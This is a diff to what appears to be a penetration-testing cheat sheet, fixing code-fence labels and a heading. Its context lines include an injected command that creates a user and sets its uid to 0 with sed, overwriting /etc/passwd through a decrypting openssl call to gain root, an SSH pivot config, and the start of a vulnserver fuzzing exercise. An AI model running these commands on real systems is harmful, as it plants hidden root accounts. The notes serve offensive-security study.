@@ -304,7 +304,7 @@ Now imagine that after we broke up into the management net after some some enume
 
 To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It's based on the example above, but is easy to extrapolate to different scenarios):
 
-```txt
+```console
 Host fw.example.mgmt
   Hostname 192.168.20.35
   User userOnFw
@@ -461,6 +461,7 @@ Now, decrypt the custom passwd overwritting in the process the real one (`/etc/p
 ```console
 cd /
 /home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
+```
     
 And finally, just login with the user created with root privileges by using `customPassword`:
 
@@ -470,7 +471,7 @@ su - ceso
 
 #### Command web injection: add user
 
-```
+```console
 /usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
 ```
 
@@ -570,7 +571,7 @@ echo %PROCESSOR_ARCHITECTURE%
 * 6 - Find return address (JMP ESP)
 * 7 - Create payload
 
-### Fuzzing: example with vulnserver + spike on TRUN command)
+### Fuzzing: example with vulnserver + spike on TRUN command
 
 ```console
 cat > trun.spk <<EOF
